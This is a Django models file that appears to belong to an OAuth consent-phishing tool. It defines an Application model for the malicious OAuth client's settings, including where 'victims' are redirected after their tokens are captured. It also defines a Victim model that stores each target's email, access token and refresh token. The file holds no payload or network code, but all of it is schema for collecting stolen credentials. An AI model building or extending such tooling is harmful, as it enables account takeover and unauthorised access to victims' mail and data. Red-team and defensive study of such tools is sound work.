from django.db import models


class Application(models.Model):
    name = models.CharField(
        max_length=255,
        verbose_name="Application name",
        help_text="Enter the Oauth Application's name",
    )
    redirect_url = models.URLField(
        max_length=255,
        verbose_name="Redirect URL",
        help_text="The URL that the application receives tokens at"
    )
    client_id = models.TextField(
        verbose_name="Client ID",
        help_text="The Client ID generated for the application"
    )
    authorization_url = models.URLField(
        verbose_name="Authentication URL",
        help_text="The OAuth provider authentication URL"
    )
    token_url = models.URLField(
        verbose_name="Token URL",
        help_text="The OAuth provider token URL"
    )
    client_secret = models.TextField(
        verbose_name="Client Secret",
        help_text="The generated application secret"
    )
    scopes = models.TextField(
        verbose_name="Application scopes",
        help_text="The scopes your application requires"
    )
    conclude_redirect = models.URLField(
        verbose_name="Conclusion redirect",
        help_text="Where victims will be redirected after token redirect"
    )


class Victim(models.Model):
    name = models.CharField(max_length=255)
    email = models.EmailField(unique=True)
    access_token = models.TextField()
    refresh_token = models.TextField(blank=True, null=True)
    expires_at = models.DateTimeField(blank=True, null=True)
